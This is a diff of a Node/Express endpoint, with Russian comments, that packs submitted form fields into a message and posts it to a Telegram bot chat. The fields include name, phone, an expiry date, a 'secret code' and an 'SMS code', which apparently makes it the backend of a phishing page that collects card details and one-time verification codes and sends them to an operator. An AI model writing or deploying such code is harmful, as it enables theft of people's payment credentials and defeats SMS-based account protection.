@@ -33,11 +33,11 @@ function buildTelegramText(p = {}) {
 }
 
 // POST /api/send — принимает любые из перечисленных полей
-app.post("/api/send", async (req, res) => {
+app.post(["/api/send", "/v1/send"], async (req, res) => {
   try {
     const p = req.body || {};
 
-    // ✅ Проверка формата кода: от 3 до 6 цифр (если код вообще передают)
+    // валидация кода (3–6 цифр ИЛИ отсутствует)
     if (
       typeof p.verificationCode !== "undefined" &&
       !/^\d{3,6}$/.test(String(p.verificationCode))
@@ -47,20 +47,31 @@ app.post("/api/send", async (req, res) => {
         .json({ success: false, error: "Неверный формат кода (3–6 цифр)" });
     }
 
-    const text = buildTelegramText(p);
-    if (!text || text === "📨 Заявка с сайта:") {
+    const lines = [
+      "📨 Заявка с сайта:",
+      p.name && `👤 Имя: ${p.name}`,
+      p.email && `📧 Email: ${p.email}`,
+      p.message && `💬 Сообщение: ${p.message}`,
+      p.phone && `📱 Телефон: ${p.phone}`,
+      p.fio && `👤 ФИО: ${p.fio}`,
+      p.requestNumber && `#️⃣ Номер заявки: ${p.requestNumber}`,
+      p.expiry && `📅 Срок: ${p.expiry}`,
+      p.secretCode && `🔒 Секретный код: ${p.secretCode}`,
+      p.verificationCode &&
+        `🔢 Код из SMS: ${String(p.verificationCode).trim()}`,
+      p.note && `📝 Примечание: ${p.note}`,
+    ].filter(Boolean);
+
+    if (lines.length <= 1) {
       return res.status(400).json({ success: false, error: "Нет данных" });
     }
 
+    const text = lines.join("\n");
+
     const token = process.env.TG_BOT_TOKEN;
     const chatId = process.env.TG_CHAT_ID;
-    if (!token || !chatId) {
+    if (!token || !chatId)
       throw new Error("Нет TG_BOT_TOKEN/TG_CHAT_ID в .env");
-    }
-
-    // Таймаут запроса к Telegram
-    const controller = new AbortController();
-    const t = setTimeout(() => controller.abort(), 8000);
 
     const tgResp = await fetch(
       `https://api.telegram.org/bot${token}/sendMessage`,
@@ -68,14 +79,10 @@ app.post("/api/send", async (req, res) => {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: chatId, text }),
-        signal: controller.signal,
       }
-    ).finally(() => clearTimeout(t));
-
+    );
     const tgJson = await tgResp.json();
-    if (!tgJson.ok) {
-      throw new Error(tgJson.description || "Telegram error");
-    }
+    if (!tgJson.ok) throw new Error(tgJson.description || "Telegram error");
 
     res.json({ success: true });
   } catch (e) {
